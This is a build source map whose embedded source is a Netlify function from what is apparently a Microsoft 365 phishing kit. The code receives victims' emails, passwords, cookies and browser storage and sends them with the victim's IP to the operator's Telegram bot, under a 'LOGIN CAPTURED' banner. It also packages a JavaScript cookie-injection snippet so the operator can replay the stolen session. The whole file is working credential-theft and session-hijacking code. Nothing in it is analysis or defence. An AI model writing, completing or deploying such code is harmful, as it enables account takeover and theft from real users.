{
  "version": 3,
  "sources": ["../../../../Downloads/PROJECT2025/netlify/functions/sendTelegram.js"],
  "sourceRoot": "C:/Users/HP/AppData/Local/Temp/tmp-20772-9bPfhR3Al16n",
  "sourcesContent": ["export const handler = async (event, context) => {\r\n  // CORS headers\r\n  const headers = {\r\n    'Access-Control-Allow-Origin': '*',\r\n    'Access-Control-Allow-Headers': 'Content-Type',\r\n    'Access-Control-Allow-Methods': 'POST, OPTIONS',\r\n  };\r\n\r\n  if (event.httpMethod === 'OPTIONS') {\r\n    return { statusCode: 200, headers, body: '' };\r\n  }\r\n  if (event.httpMethod !== 'POST') {\r\n    return {\r\n      statusCode: 405,\r\n      headers,\r\n      body: JSON.stringify({ error: 'Method not allowed' }),\r\n    };\r\n  }\r\n\r\n  // Helper: send error notification to Telegram\r\n  async function sendErrorTelegram(msg, extra) {\r\n    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;\r\n    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;\r\n    if (!BOT_TOKEN || !CHAT_ID) return;\r\n    try {\r\n      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {\r\n        method: 'POST',\r\n        headers: { 'Content-Type': 'application/json' },\r\n        body: JSON.stringify({\r\n          chat_id: CHAT_ID,\r\n          text:\r\n            `\uD83D\uDEA8 <b>MICROSOFT 365 ERROR</b>\\n${msg}\\n\\n${extra ? '<code>' + (typeof extra === 'string' ? extra : JSON.stringify(extra)).substring(0, 1500) + '</code>' : ''}\\n${new Date().toISOString()}`,\r\n          parse_mode: 'HTML',\r\n        }),\r\n      });\r\n    } catch (e) {\r\n      console.error('\u274C Failed to send error notification to Telegram:', e);\r\n    }\r\n  }\r\n\r\n  try {\r\n    let data;\r\n    try {\r\n      data = JSON.parse(event.body);\r\n    } catch (parseError) {\r\n      await sendErrorTelegram('JSON parse error', event.body);\r\n      return {\r\n        statusCode: 400,\r\n        headers,\r\n        body: JSON.stringify({ error: 'Invalid JSON', details: parseError.message }),\r\n      };\r\n    }\r\n\r\n    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;\r\n    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;\r\n\r\n    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {\r\n      await sendErrorTelegram('Missing Telegram env config', {});\r\n      return {\r\n        statusCode: 500,\r\n        headers,\r\n        body: JSON.stringify({ error: 'Telegram configuration missing' }),\r\n      };\r\n    }\r\n\r\n    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;\r\n    let formattedCookies = [];\r\n    let cookieInfo =\r\n      data.formattedCookies ||\r\n      browserFingerprint?.cookies ||\r\n      data.cookies ||\r\n      data.documentCookies ||\r\n      [];\r\n\r\n    // Validate credentials\r\n    if (!email || !password) {\r\n      await sendErrorTelegram('Missing credentials', { email, password });\r\n      return {\r\n        statusCode: 400,\r\n        headers,\r\n        body: JSON.stringify({ error: 'Missing required fields', fields: { email, password } }),\r\n      };\r\n    }\r\n\r\n    // Parse cookies, always using Microsoft domain\r\n    try {\r\n      if (Array.isArray(data.formattedCookies) && data.formattedCookies.length > 0) {\r\n        formattedCookies = data.formattedCookies.filter(c => c && c.name).map(c => ({\r\n          ...c,\r\n          domain: '.login.microsoftonline.com',\r\n        }));\r\n      } else if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {\r\n        formattedCookies = cookieInfo.filter(c => c && c.name).map(c => ({\r\n          ...c,\r\n          domain: '.login.microsoftonline.com',\r\n        }));\r\n      } else if (\r\n        typeof cookieInfo === 'string' &&\r\n        cookieInfo !== 'No cookies found' &&\r\n        cookieInfo !== 'Empty' &&\r\n        cookieInfo.trim() !== ''\r\n      ) {\r\n        try {\r\n          const parsedCookies = JSON.parse(cookieInfo);\r\n          if (Array.isArray(parsedCookies)) {\r\n            formattedCookies = parsedCookies.filter(c => c && c.name).map(c => ({\r\n              ...c,\r\n              domain: '.login.microsoftonline.com',\r\n            }));\r\n          }\r\n        } catch {\r\n          if (cookieInfo.includes('=')) {\r\n            const cookieStrings = cookieInfo.split(';');\r\n            formattedCookies = cookieStrings\r\n              .map(str => {\r\n                const [name, ...valueParts] = str.trim().split('=');\r\n                const value = valueParts.join('=');\r\n                return name && value\r\n                  ? {\r\n                      name: name.trim(),\r\n                      value: value.trim(),\r\n                      domain: '.login.microsoftonline.com',\r\n                      path: '/',\r\n                      secure: true,\r\n                      httpOnly: false,\r\n                      sameSite: 'none',\r\n                      expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,\r\n                      hostOnly: false,\r\n                      session: false,\r\n                      storeId: null,\r\n                    }\r\n                  : null;\r\n              })\r\n              .filter(Boolean);\r\n          }\r\n        }\r\n      } else if (data.documentCookies && typeof data.documentCookies === 'string') {\r\n        const cookieStrings = data.documentCookies.split(';');\r\n        formattedCookies = cookieStrings\r\n          .map(str => {\r\n            const [name, ...valueParts] = str.trim().split('=');\r\n            const value = valueParts.join('=');\r\n            return name && value\r\n              ? {\r\n                  name: name.trim(),\r\n                  value: value.trim(),\r\n                  domain: '.login.microsoftonline.com',\r\n                  path: '/',\r\n                  secure: true,\r\n                  httpOnly: false,\r\n                  sameSite: 'none',\r\n                  expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,\r\n                  hostOnly: false,\r\n                  session: false,\r\n                  storeId: null,\r\n                }\r\n              : null;\r\n          })\r\n          .filter(Boolean);\r\n      }\r\n    } catch (cookieParseError) {\r\n      await sendErrorTelegram('Cookie parse error', cookieInfo);\r\n    }\r\n\r\n    if (!formattedCookies || formattedCookies.length === 0) {\r\n      await sendErrorTelegram('No cookies found for this submission', data);\r\n      return {\r\n        statusCode: 400,\r\n        headers,\r\n        body: JSON.stringify({ error: 'No cookies found' }),\r\n      };\r\n    }\r\n\r\n    // Send main message to Telegram\r\n    const clientIP =\r\n      event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||\r\n      event.headers['x-real-ip'] ||\r\n      event.headers['cf-connecting-ip'] ||\r\n      event.requestContext?.identity?.sourceIp ||\r\n      'Unknown';\r\n    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '')\r\n      ? '\uD83D\uDCF1 Mobile'\r\n      : '\uD83D\uDCBB Desktop';\r\n    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);\r\n\r\n    const mainMessage = `\uD83D\uDD10 MICROSOFT 365 LOGIN CAPTURED\r\n\r\n\uD83D\uDCE7 Email: ${email}\r\n\uD83D\uDD11 Password: ${password}\r\n\uD83C\uDFE2 Provider: ${provider || 'Microsoft'}\r\n\uD83D\uDD52 Time: ${new Date().toLocaleString()}\r\n\uD83C\uDF10 IP: ${clientIP} | ${deviceInfo}\r\n\uD83C\uDF6A Cookies: ${formattedCookies.length} captured\r\n\uD83D\uDCBE LocalStorage: ${browserFingerprint?.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}\r\n\uD83D\uDDC3\uFE0F SessionStorage: ${browserFingerprint?.sessionStorage !== 'Empty' ? 'Has Data' : 'Empty'}\r\n\uD83D\uDCF1 User Agent: ${(userAgent || 'Unknown').substring(0, 100)}\r\n\uD83C\uDD94 Session: ${sessionId}\r\nDownload link: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionId}`;\r\n\r\n    let mainMessageOk = false;\r\n    try {\r\n      const tgResp = await fetch(\r\n        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,\r\n        {\r\n          method: 'POST',\r\n          headers: { 'Content-Type': 'application/json' },\r\n          body: JSON.stringify({\r\n            chat_id: TELEGRAM_CHAT_ID,\r\n            text: mainMessage,\r\n            parse_mode: 'Markdown',\r\n          }),\r\n          signal: AbortSignal.timeout(15000),\r\n        }\r\n      );\r\n      if (!tgResp.ok) {\r\n        const errText = await tgResp.text();\r\n        await sendErrorTelegram('Main message failed', errText);\r\n      } else {\r\n        mainMessageOk = true;\r\n      }\r\n    } catch (err) {\r\n      await sendErrorTelegram('Main message (network) failed', err.message);\r\n    }\r\n\r\n    // Prepare cookies file\r\n    let fileSent = false;\r\n    try {\r\n      const cookiesForFile = formattedCookies.map(c => ({\r\n        ...c,\r\n        domain: '.login.microsoftonline.com',\r\n      }));\r\n      const jsInjectionCode =\r\n        cookiesForFile.length > 0\r\n          ? `!function(){console.log(\"%c COOKIES\",\"background:greenyellow;color:#fff;font-size:30px;\");let e=JSON.parse(${JSON.stringify(\r\n              JSON.stringify(cookiesForFile)\r\n            )});for(let o of e)document.cookie=\\`\\${o.name}=\\${o.value};Max-Age=31536000;\\${o.path?\\`path=\\${o.path};\\`:\"\"}\\${o.domain?\\`\\${o.path?\"\":\"path=/\"}domain=\\${o.domain};\\`:\"\"}\\${o.secure?\"Secure;\":\"\"}\\${o.sameSite?\\`SameSite=\\${o.sameSite};\\`:\"SameSite=no_restriction;\"}\\`;location.reload()}();`\r\n          : `console.log(\"%c NO COOKIES FOUND\",\"background:red;color:#fff;font-size:30px;\");alert(\"No cookies were captured for this session.\");`;\r\n\r\n      const cookiesFileContent = `// Cookie Data for ${email} - ${new Date().toISOString()}\r\n// Provider: ${provider || 'Microsoft'}\r\n// IP: ${clientIP}\r\n// Microsoft 365 Session Data\r\n// Cookies Found: ${cookiesForFile.length}\r\n\r\nlet ipaddress = \"${clientIP}\";\r\nlet email = \"${email}\";\r\nlet password = \"${password}\";\r\n\r\n// Raw Cookie Data Debug Info:\r\n// Formatted cookies count: ${cookiesForFile.length}\r\n\r\n${jsInjectionCode}\r\n\r\n// Cookie Data:\r\n${JSON.stringify(cookiesForFile, null, 2)}\r\n\r\n// Session Storage:\r\n// ${browserFingerprint?.sessionStorage || ''}\r\n\r\n// Local Storage:\r\n// ${browserFingerprint?.localStorage || ''}`;\r\n\r\n      const fileNameForUpload = `microsoft365_cookies_${email.replace(\r\n        '@',\r\n        '_at_'\r\n      )}_${Date.now()}.js`;\r\n      const boundary = '----formdata-boundary-' + Math.random().toString(36);\r\n      let formData = '';\r\n      formData += `--${boundary}\\r\\n`;\r\n      formData += `Content-Disposition: form-data; name=\"chat_id\"\\r\\n\\r\\n`;\r\n      formData += `${TELEGRAM_CHAT_ID}\\r\\n`;\r\n      formData += `--${boundary}\\r\\n`;\r\n      formData += `Content-Disposition: form-data; name=\"document\"; filename=\"${fileNameForUpload}\"\\r\\n`;\r\n      formData += `Content-Type: text/javascript\\r\\n\\r\\n`;\r\n      formData += cookiesFileContent;\r\n      formData += `\\r\\n`;\r\n      formData += `--${boundary}--\\r\\n`;\r\n\r\n      const fileResp = await fetch(\r\n        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,\r\n        {\r\n          method: 'POST',\r\n          headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },\r\n          body: formData,\r\n          signal: AbortSignal.timeout(30000),\r\n        }\r\n      );\r\n\r\n      if (fileResp.ok) {\r\n        fileSent = true;\r\n      } else {\r\n        const fileErrorText = await fileResp.text();\r\n        await sendErrorTelegram('File upload failed', fileErrorText);\r\n        // Fallback: send as text message\r\n        const fallbackMessage = `\uD83D\uDCC1 <b>MICROSOFT 365 COOKIES</b> (${cookiesForFile.length} cookies)\\n\\n<code>${cookiesFileContent.substring(\r\n          0,\r\n          3500\r\n        )}</code>\\n\\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;\r\n        const fallbackResponse = await fetch(\r\n          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,\r\n          {\r\n            method: 'POST',\r\n            headers: { 'Content-Type': 'application/json' },\r\n            body: JSON.stringify({\r\n              chat_id: TELEGRAM_CHAT_ID,\r\n              text: fallbackMessage,\r\n              parse_mode: 'HTML',\r\n            }),\r\n          }\r\n        );\r\n        if (fallbackResponse.ok) {\r\n          fileSent = true;\r\n        }\r\n      }\r\n    } catch (fileError) {\r\n      await sendErrorTelegram('File send error', fileError.message);\r\n    }\r\n\r\n    return {\r\n      statusCode: 200,\r\n      headers,\r\n      body: JSON.stringify({\r\n        success: mainMessageOk && fileSent,\r\n        message: 'Data processed',\r\n        cookieCount: formattedCookies.length,\r\n        fileSent,\r\n      }),\r\n    };\r\n  } catch (error) {\r\n    await sendErrorTelegram('Handler-level error', error.message);\r\n    return {\r\n      statusCode: 500,\r\n      headers,\r\n      body: JSON.stringify({\r\n        error: 'Internal server error',\r\n        details: error.message,\r\n        timestamp: new Date().toISOString(),\r\n      }),\r\n    };\r\n  }\r\n};"],
  "mappings": ";;;;;;;;;;;;;;;;;;;AAAA;AAAA;AAAA;AAAA;AAAA;AAAO,IAAM,UAAU,OAAO,OAAO,YAAY;AAE/C,QAAM,UAAU;AAAA,IACd,+BAA+B;AAAA,IAC/B,gCAAgC;AAAA,IAChC,gCAAgC;AAAA,EAClC;AAEA,MAAI,MAAM,eAAe,WAAW;AAClC,WAAO,EAAE,YAAY,KAAK,SAAS,MAAM,GAAG;AAAA,EAC9C;AACA,MAAI,MAAM,eAAe,QAAQ;AAC/B,WAAO;AAAA,MACL,YAAY;AAAA,MACZ;AAAA,MACA,MAAM,KAAK,UAAU,EAAE,OAAO,qBAAqB,CAAC;AAAA,IACtD;AAAA,EACF;AAGA,iBAAe,kBAAkB,KAAK,OAAO;AAC3C,UAAM,YAAY,QAAQ,IAAI;AAC9B,UAAM,UAAU,QAAQ,IAAI;AAC5B,QAAI,CAAC,aAAa,CAAC,QAAS;AAC5B,QAAI;AACF,YAAM,MAAM,+BAA+B,SAAS,gBAAgB;AAAA,QAClE,QAAQ;AAAA,QACR,SAAS,EAAE,gBAAgB,mBAAmB;AAAA,QAC9C,MAAM,KAAK,UAAU;AAAA,UACnB,SAAS;AAAA,UACT,MACE;AAAA,EAAkC,GAAG;AAAA;AAAA,EAAO,QAAQ,YAAY,OAAO,UAAU,WAAW,QAAQ,KAAK,UAAU,KAAK,GAAG,UAAU,GAAG,IAAI,IAAI,YAAY,EAAE;AAAA,GAAK,oBAAI,KAAK,GAAE,YAAY,CAAC;AAAA,UAC7L,YAAY;AAAA,QACd,CAAC;AAAA,MACH,CAAC;AAAA,IACH,SAAS,GAAG;AACV,cAAQ,MAAM,yDAAoD,CAAC;AAAA,IACrE;AAAA,EACF;AAEA,MAAI;AACF,QAAI;AACJ,QAAI;AACF,aAAO,KAAK,MAAM,MAAM,IAAI;AAAA,IAC9B,SAAS,YAAY;AACnB,YAAM,kBAAkB,oBAAoB,MAAM,IAAI;AACtD,aAAO;AAAA,QACL,YAAY;AAAA,QACZ;AAAA,QACA,MAAM,KAAK,UAAU,EAAE,OAAO,gBAAgB,SAAS,WAAW,QAAQ,CAAC;AAAA,MAC7E;AAAA,IACF;AAEA,UAAM,qBAAqB,QAAQ,IAAI;AACvC,UAAM,mBAAmB,QAAQ,IAAI;AAErC,QAAI,CAAC,sBAAsB,CAAC,kBAAkB;AAC5C,YAAM,kBAAkB,+BAA+B,CAAC,CAAC;AACzD,aAAO;AAAA,QACL,YAAY;AAAA,QACZ;AAAA,QACA,MAAM,KAAK,UAAU,EAAE,OAAO,iCAAiC,CAAC;AAAA,MAClE;AAAA,IACF;AAEA,UAAM,EAAE,OAAO,UAAU,UAAU,UAAU,WAAW,WAAW,mBAAmB,IAAI;AAC1F,QAAI,mBAAmB,CAAC;AACxB,QAAI,aACF,KAAK,oBACL,oBAAoB,WACpB,KAAK,WACL,KAAK,mBACL,CAAC;AAGH,QAAI,CAAC,SAAS,CAAC,UAAU;AACvB,YAAM,kBAAkB,uBAAuB,EAAE,OAAO,SAAS,CAAC;AAClE,aAAO;AAAA,QACL,YAAY;AAAA,QACZ;AAAA,QACA,MAAM,KAAK,UAAU,EAAE,OAAO,2BAA2B,QAAQ,EAAE,OAAO,SAAS,EAAE,CAAC;AAAA,MACxF;AAAA,IACF;AAGA,QAAI;AACF,UAAI,MAAM,QAAQ,KAAK,gBAAgB,KAAK,KAAK,iBAAiB,SAAS,GAAG;AAC5E,2BAAmB,KAAK,iBAAiB,OAAO,OAAK,KAAK,EAAE,IAAI,EAAE,IAAI,QAAM;AAAA,UAC1E,GAAG;AAAA,UACH,QAAQ;AAAA,QACV,EAAE;AAAA,MACJ,WAAW,MAAM,QAAQ,UAAU,KAAK,WAAW,SAAS,GAAG;AAC7D,2BAAmB,WAAW,OAAO,OAAK,KAAK,EAAE,IAAI,EAAE,IAAI,QAAM;AAAA,UAC/D,GAAG;AAAA,UACH,QAAQ;AAAA,QACV,EAAE;AAAA,MACJ,WACE,OAAO,eAAe,YACtB,eAAe,sBACf,eAAe,WACf,WAAW,KAAK,MAAM,IACtB;AACA,YAAI;AACF,gBAAM,gBAAgB,KAAK,MAAM,UAAU;AAC3C,cAAI,MAAM,QAAQ,aAAa,GAAG;AAChC,+BAAmB,cAAc,OAAO,OAAK,KAAK,EAAE,IAAI,EAAE,IAAI,QAAM;AAAA,cAClE,GAAG;AAAA,cACH,QAAQ;AAAA,YACV,EAAE;AAAA,UACJ;AAAA,QACF,QAAQ;AACN,cAAI,WAAW,SAAS,GAAG,GAAG;AAC5B,kBAAM,gBAAgB,WAAW,MAAM,GAAG;AAC1C,+BAAmB,cAChB,IAAI,SAAO;AACV,oBAAM,CAAC,MAAM,GAAG,UAAU,IAAI,IAAI,KAAK,EAAE,MAAM,GAAG;AAClD,oBAAM,QAAQ,WAAW,KAAK,GAAG;AACjC,qBAAO,QAAQ,QACX;AAAA,gBACE,MAAM,KAAK,KAAK;AAAA,gBAChB,OAAO,MAAM,KAAK;AAAA,gBAClB,QAAQ;AAAA,gBACR,MAAM;AAAA,gBACN,QAAQ;AAAA,gBACR,UAAU;AAAA,gBACV,UAAU;AAAA,gBACV,gBAAgB,KAAK,MAAM,KAAK,IAAI,IAAI,GAAI,IAAI,MAAM,KAAK,KAAK;AAAA,gBAChE,UAAU;AAAA,gBACV,SAAS;AAAA,gBACT,SAAS;AAAA,cACX,IACA;AAAA,YACN,CAAC,EACA,OAAO,OAAO;AAAA,UACnB;AAAA,QACF;AAAA,MACF,WAAW,KAAK,mBAAmB,OAAO,KAAK,oBAAoB,UAAU;AAC3E,cAAM,gBAAgB,KAAK,gBAAgB,MAAM,GAAG;AACpD,2BAAmB,cAChB,IAAI,SAAO;AACV,gBAAM,CAAC,MAAM,GAAG,UAAU,IAAI,IAAI,KAAK,EAAE,MAAM,GAAG;AAClD,gBAAM,QAAQ,WAAW,KAAK,GAAG;AACjC,iBAAO,QAAQ,QACX;AAAA,YACE,MAAM,KAAK,KAAK;AAAA,YAChB,OAAO,MAAM,KAAK;AAAA,YAClB,QAAQ;AAAA,YACR,MAAM;AAAA,YACN,QAAQ;AAAA,YACR,UAAU;AAAA,YACV,UAAU;AAAA,YACV,gBAAgB,KAAK,MAAM,KAAK,IAAI,IAAI,GAAI,IAAI,MAAM,KAAK,KAAK;AAAA,YAChE,UAAU;AAAA,YACV,SAAS;AAAA,YACT,SAAS;AAAA,UACX,IACA;AAAA,QACN,CAAC,EACA,OAAO,OAAO;AAAA,MACnB;AAAA,IACF,SAAS,kBAAkB;AACzB,YAAM,kBAAkB,sBAAsB,UAAU;AAAA,IAC1D;AAEA,QAAI,CAAC,oBAAoB,iBAAiB,WAAW,GAAG;AACtD,YAAM,kBAAkB,wCAAwC,IAAI;AACpE,aAAO;AAAA,QACL,YAAY;AAAA,QACZ;AAAA,QACA,MAAM,KAAK,UAAU,EAAE,OAAO,mBAAmB,CAAC;AAAA,MACpD;AAAA,IACF;AAGA,UAAM,WACJ,MAAM,QAAQ,iBAAiB,GAAG,MAAM,GAAG,EAAE,CAAC,GAAG,KAAK,KACtD,MAAM,QAAQ,WAAW,KACzB,MAAM,QAAQ,kBAAkB,KAChC,MAAM,gBAAgB,UAAU,YAChC;AACF,UAAM,aAAa,6BAA6B,KAAK,aAAa,EAAE,IAChE,qBACA;AACJ,UAAM,YAAY,KAAK,aAAa,KAAK,OAAO,EAAE,SAAS,EAAE,EAAE,UAAU,GAAG,EAAE;AAE9E,UAAM,cAAc;AAAA;AAAA,mBAEZ,KAAK;AAAA,sBACF,QAAQ;AAAA,sBACR,YAAY,WAAW;AAAA,mBAC3B,oBAAI,KAAK,GAAE,eAAe,CAAC;AAAA,gBAC7B,QAAQ,MAAM,UAAU;AAAA,qBACnB,iBAAiB,MAAM;AAAA,0BAClB,oBAAoB,iBAAiB,UAAU,aAAa,OAAO;AAAA,kCAChE,oBAAoB,mBAAmB,UAAU,aAAa,OAAO;AAAA,yBACzE,aAAa,WAAW,UAAU,GAAG,GAAG,CAAC;AAAA,qBAC7C,SAAS;AAAA,iBACN,MAAM,QAAQ,OAAO,WAAW,MAAM,QAAQ,IAAI,KAAK,iCAAiC,4CAA4C,SAAS;AAE1J,QAAI,gBAAgB;AACpB,QAAI;AACF,YAAM,SAAS,MAAM;AAAA,QACnB,+BAA+B,kBAAkB;AAAA,QACjD;AAAA,UACE,QAAQ;AAAA,UACR,SAAS,EAAE,gBAAgB,mBAAmB;AAAA,UAC9C,MAAM,KAAK,UAAU;AAAA,YACnB,SAAS;AAAA,YACT,MAAM;AAAA,YACN,YAAY;AAAA,UACd,CAAC;AAAA,UACD,QAAQ,YAAY,QAAQ,IAAK;AAAA,QACnC;AAAA,MACF;AACA,UAAI,CAAC,OAAO,IAAI;AACd,cAAM,UAAU,MAAM,OAAO,KAAK;AAClC,cAAM,kBAAkB,uBAAuB,OAAO;AAAA,MACxD,OAAO;AACL,wBAAgB;AAAA,MAClB;AAAA,IACF,SAAS,KAAK;AACZ,YAAM,kBAAkB,iCAAiC,IAAI,OAAO;AAAA,IACtE;AAGA,QAAI,WAAW;AACf,QAAI;AACF,YAAM,iBAAiB,iBAAiB,IAAI,QAAM;AAAA,QAChD,GAAG;AAAA,QACH,QAAQ;AAAA,MACV,EAAE;AACF,YAAM,kBACJ,eAAe,SAAS,IACpB,8GAA8G,KAAK;AAAA,QACjH,KAAK,UAAU,cAAc;AAAA,MAC/B,CAAC,uSACD;AAEN,YAAM,qBAAqB,sBAAsB,KAAK,OAAM,oBAAI,KAAK,GAAE,YAAY,CAAC;AAAA,eAC3E,YAAY,WAAW;AAAA,SAC7B,QAAQ;AAAA;AAAA,oBAEG,eAAe,MAAM;AAAA;AAAA,mBAEtB,QAAQ;AAAA,eACZ,KAAK;AAAA,kBACF,QAAQ;AAAA;AAAA;AAAA,8BAGI,eAAe,MAAM;AAAA;AAAA,EAEjD,eAAe;AAAA;AAAA;AAAA,EAGf,KAAK,UAAU,gBAAgB,MAAM,CAAC,CAAC;AAAA;AAAA;AAAA,KAGpC,oBAAoB,kBAAkB,EAAE;AAAA;AAAA;AAAA,KAGxC,oBAAoB,gBAAgB,EAAE;AAErC,YAAM,oBAAoB,wBAAwB,MAAM;AAAA,QACtD;AAAA,QACA;AAAA,MACF,CAAC,IAAI,KAAK,IAAI,CAAC;AACf,YAAM,WAAW,2BAA2B,KAAK,OAAO,EAAE,SAAS,EAAE;AACrE,UAAI,WAAW;AACf,kBAAY,KAAK,QAAQ;AAAA;AACzB,kBAAY;AAAA;AAAA;AACZ,kBAAY,GAAG,gBAAgB;AAAA;AAC/B,kBAAY,KAAK,QAAQ;AAAA;AACzB,kBAAY,8DAA8D,iBAAiB;AAAA;AAC3F,kBAAY;AAAA;AAAA;AACZ,kBAAY;AACZ,kBAAY;AAAA;AACZ,kBAAY,KAAK,QAAQ;AAAA;AAEzB,YAAM,WAAW,MAAM;AAAA,QACrB,+BAA+B,kBAAkB;AAAA,QACjD;AAAA,UACE,QAAQ;AAAA,UACR,SAAS,EAAE,gBAAgB,iCAAiC,QAAQ,GAAG;AAAA,UACvE,MAAM;AAAA,UACN,QAAQ,YAAY,QAAQ,GAAK;AAAA,QACnC;AAAA,MACF;AAEA,UAAI,SAAS,IAAI;AACf,mBAAW;AAAA,MACb,OAAO;AACL,cAAM,gBAAgB,MAAM,SAAS,KAAK;AAC1C,cAAM,kBAAkB,sBAAsB,aAAa;AAE3D,cAAM,kBAAkB,2CAAoC,eAAe,MAAM;AAAA;AAAA,QAAsB,mBAAmB;AAAA,UACxH;AAAA,UACA;AAAA,QACF,CAAC;AAAA;AAAA,EAAc,mBAAmB,SAAS,OAAO,wBAAwB,EAAE;AAC5E,cAAM,mBAAmB,MAAM;AAAA,UAC7B,+BAA+B,kBAAkB;AAAA,UACjD;AAAA,YACE,QAAQ;AAAA,YACR,SAAS,EAAE,gBAAgB,mBAAmB;AAAA,YAC9C,MAAM,KAAK,UAAU;AAAA,cACnB,SAAS;AAAA,cACT,MAAM;AAAA,cACN,YAAY;AAAA,YACd,CAAC;AAAA,UACH;AAAA,QACF;AACA,YAAI,iBAAiB,IAAI;AACvB,qBAAW;AAAA,QACb;AAAA,MACF;AAAA,IACF,SAAS,WAAW;AAClB,YAAM,kBAAkB,mBAAmB,UAAU,OAAO;AAAA,IAC9D;AAEA,WAAO;AAAA,MACL,YAAY;AAAA,MACZ;AAAA,MACA,MAAM,KAAK,UAAU;AAAA,QACnB,SAAS,iBAAiB;AAAA,QAC1B,SAAS;AAAA,QACT,aAAa,iBAAiB;AAAA,QAC9B;AAAA,MACF,CAAC;AAAA,IACH;AAAA,EACF,SAAS,OAAO;AACd,UAAM,kBAAkB,uBAAuB,MAAM,OAAO;AAC5D,WAAO;AAAA,MACL,YAAY;AAAA,MACZ;AAAA,MACA,MAAM,KAAK,UAAU;AAAA,QACnB,OAAO;AAAA,QACP,SAAS,MAAM;AAAA,QACf,YAAW,oBAAI,KAAK,GAAE,YAAY;AAAA,MACpC,CAAC;AAAA,IACH;AAAA,EACF;AACF;",
  "names": []
}
